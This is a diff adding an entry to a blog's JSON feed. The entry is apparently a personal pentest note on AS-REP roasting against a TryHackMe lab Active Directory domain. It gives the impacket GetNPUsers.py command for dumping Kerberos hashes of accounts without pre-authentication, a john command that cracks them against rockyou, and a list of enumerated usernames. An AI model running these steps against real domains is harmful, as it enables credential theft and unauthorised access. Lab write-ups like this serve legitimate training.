@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
+            "title": "AS-REP Roasting using Impacket",
+            "summary": "AS-REP Roasting using Impacket",
+            "content_text": "Overview  With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled  One way of getting valid usernames is to use [[Kerbrute]] technique  See [[AS-REP]] for theory behind this attackSteps  Add DC entry to hosts file10.10.135.224 SPOOKYSEC.local  Get a list of valid accounts using [[Kerbrute]]  Put them into a txt filesvc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local  Run impacket to determine what accounts are AS-REP roastablepython3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass  Here is an example output.  Crack the hashes and enjoy!john --wordlist=/usr/share/wordlists/rockyou.txt out.johnGotchasI encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH setBut then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!",
+            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>With valid usernames, attacker can intercept NTLMv2 hash and crack it to get the password because pre-authentication phase is disabled</li>  <li>One way of getting valid usernames is to use [[Kerbrute]] technique</li>  <li>See [[AS-REP]] for theory behind this attack</li></ul><h2 id=\"steps\">Steps</h2><ul>  <li>Add DC entry to hosts file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>10.10.135.224 SPOOKYSEC.local</code></pre></div></div><ul>  <li>Get a list of valid accounts using [[Kerbrute]]</li>  <li>Put them into a txt file</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>svc-admin@spookysec.localJames@spookysec.localrobin@spookysec.localdarkstar@spookysec.localadministrator@spookysec.localbackup@spookysec.localparadox@spookysec.localJAMES@spookysec.localRobin@spookysec.localAdministrator@spookysec.local</code></pre></div></div><ul>  <li>Run impacket to determine what accounts are AS-REP roastable</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py SPOOKYSEC.local/ -usersfile users.txt -format john -outputfile out.john -no-pass</code></pre></div></div><ul>  <li>Here is an example output.</li></ul><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/76430BF0-31FD-4DBF-A15F-81F0CFB51661.png\" alt=\"\" /></p><ul>  <li>Crack the hashes and enjoy!</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>john <span class=\"nt\">--wordlist</span><span class=\"o\">=</span>/usr/share/wordlists/rockyou.txt out.john</code></pre></div></div><h2 id=\"gotchas\">Gotchas</h2><p>I encounter an issue on THM ra box. Output tells that user doesn’t require preauth set.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>[-] User buse@windcorp.thm doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre></div></div><p>But then there was no hashes dumped. When I checked the connections in wireshark, I see that its requiring pre auth!</p><p><img src=\"/spindel/assets/AS-REP%20Roasting%20using%20Impacket/A89116D4-A26E-46F4-9C17-44EF3E91FA4D.png\" alt=\"\" /></p>",
+            "url": "https://mvineza.github.io/spindel/2022/03/07/as-rep-roasting-using-impacket",
+            
+            
+            
+            "tags": ["windows","ad","kerberos","foothold"],
+            
+            "date_published": "2022-03-07T00:00:00+08:00",
+            "date_modified": "2022-03-07T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/03/05/pd4ml-attachment-from-dynamodb",
             "title": "PD4ML Attachment from DynamoDB",
             "summary": "PD4ML Attachment from DynamoDB",
